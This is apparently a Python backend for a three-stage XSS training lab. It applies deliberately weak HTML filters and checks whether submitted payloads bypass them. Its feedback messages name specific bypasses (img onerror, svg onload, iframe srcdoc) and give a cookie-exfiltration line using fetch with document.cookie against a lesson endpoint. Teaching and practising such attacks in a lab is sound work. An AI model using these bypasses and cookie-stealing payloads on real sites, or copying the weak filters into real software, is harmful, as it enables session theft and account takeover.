"""
XSS lesson backend — three stages.

Demo (worked example) success: the payload survives the filter and contains an
executable construct. Challenge success: the payload also targets
/lesson/xss/steal so the simulated admin's cookie would be exfiltrated.

These viewers don't execute JavaScript. They detect, with a small parser,
whether a payload would be executable in a real browser AND whether it would
issue a request to /steal — sufficient for teaching the bypass without a
real headless browser.
"""
import re

ADMIN_COOKIE_VALUE = "letmein-admin"

SCRIPT_TAG_FULL = re.compile(r"<\s*script\b[^>]*>.*?</\s*script\s*>", re.IGNORECASE | re.DOTALL)
SCRIPT_TAG_OPEN = re.compile(r"<\s*script\b", re.IGNORECASE)
ON_EVENT_ATTR   = re.compile(r"\son\w+\s*=", re.IGNORECASE)


def stage1_filter(payload: str) -> str:
    out = SCRIPT_TAG_FULL.sub("", payload or "")
    out = SCRIPT_TAG_OPEN.sub("&lt;script", out)
    return out


def stage2_filter(payload: str) -> str:
    return ON_EVENT_ATTR.sub(" ", payload or "")


# Executable constructs that survive each stage's filter.
STAGE1_EXEC = re.compile(
    r"on\w+\s*=|<\s*svg\b[^>]*on\w+|<\s*img\b[^>]*on\w+|"
    r"<\s*iframe\b[^>]*src\s*=\s*['\"]?javascript:|<\s*body\b[^>]*on\w+",
    re.IGNORECASE,
)
STAGE2_EXEC = re.compile(
    r"<\s*iframe\b[^>]*srcdoc|<\s*svg\b|<\s*math\b|<\s*details\b",
    re.IGNORECASE,
)
EXFIL_RE = re.compile(r"/lesson/xss/steal", re.IGNORECASE)


def stage1_admin_view(payload: str) -> dict:
    rendered = stage1_filter(payload)
    has_exec = bool(STAGE1_EXEC.search(rendered))
    has_exfil = bool(EXFIL_RE.search(rendered))
    return {
        "rendered": rendered,
        "has_exec": has_exec,
        "exfil": has_exec and has_exfil,
        "cookie": ADMIN_COOKIE_VALUE if (has_exec and has_exfil) else None,
    }


def stage2_admin_view(payload: str) -> dict:
    rendered = stage2_filter(payload)
    # An srcdoc'd iframe carries inner HTML through the on*= filter.
    has_exec = bool(STAGE2_EXEC.search(rendered))
    has_exfil = bool(EXFIL_RE.search(rendered))
    return {
        "rendered": rendered,
        "has_exec": has_exec,
        "exfil": has_exec and has_exfil,
        "cookie": ADMIN_COOKIE_VALUE if (has_exec and has_exfil) else None,
    }


def stage3_admin_view(url: str) -> dict:
    if not url or "#" not in url:
        return {"rendered": "", "has_exec": False, "exfil": False, "cookie": None}
    fragment = url.split("#", 1)[1]
    try:
        from urllib.parse import unquote
        rendered = unquote(fragment)
    except Exception:
        rendered = fragment
    # innerHTML refuses to run <script>, but event handlers fire.
    has_script = bool(re.search(r"<\s*script\b", rendered, re.IGNORECASE))
    has_exec = bool(re.search(r"on\w+\s*=", rendered, re.IGNORECASE)) and not has_script
    has_exfil = bool(EXFIL_RE.search(rendered))
    return {
        "rendered": rendered,
        "has_exec": has_exec,
        "exfil": has_exec and has_exfil,
        "cookie": ADMIN_COOKIE_VALUE if (has_exec and has_exfil) else None,
    }


def classify_failure(stage_n: int, view: dict, payload: str) -> str | None:
    """Smart feedback for the challenge form (which requires exfil)."""
    p = (payload or "").strip()
    if not p:
        return "Submit a payload that will run in the admin's browser."
    if not view.get("has_exec"):
        if stage_n == 1:
            if "<script" in p.lower():
                return ("The filter stripped your <code>&lt;script&gt;</code> tag. "
                        "Try an event handler that survives, like <code>&lt;img onerror=...&gt;</code> or "
                        "<code>&lt;svg onload=...&gt;</code>.")
            return "Your payload didn't include an executable construct. Add an event handler (onerror, onload, ...)."
        if stage_n == 2:
            if "on" in p.lower() and "=" in p:
                return ("The filter removed your <code>on*=</code> attribute. "
                        "Try wrapping your handler inside an <code>&lt;iframe srcdoc=\"...\"&gt;</code> with the inner HTML entity-encoded.")
            return "Your payload doesn't run. The on*= filter stripped any direct handler — try iframe srcdoc."
        if stage_n == 3:
            if "<script" in p.lower():
                return "innerHTML refuses to execute &lt;script&gt; tags. Use <code>&lt;img onerror=...&gt;</code> instead."
            return "The fragment didn't contain an executable handler. Add an <code>&lt;img onerror=...&gt;</code>."
    if not view.get("exfil"):
        return ("Your payload runs (filter bypass works!), but it doesn't call <code>/lesson/xss/steal</code>. "
                "Use <code>fetch('/lesson/xss/steal?c='+document.cookie)</code> inside your handler.")
    return None


# In-memory comment store for stage 2.
_STAGE2_COMMENTS: list[str] = []


def stage2_post_comment(payload: str) -> None:
    _STAGE2_COMMENTS.append(payload or "")
    if len(_STAGE2_COMMENTS) > 20:
        del _STAGE2_COMMENTS[:-20]


def stage2_latest_comments() -> list[str]:
    return list(_STAGE2_COMMENTS)
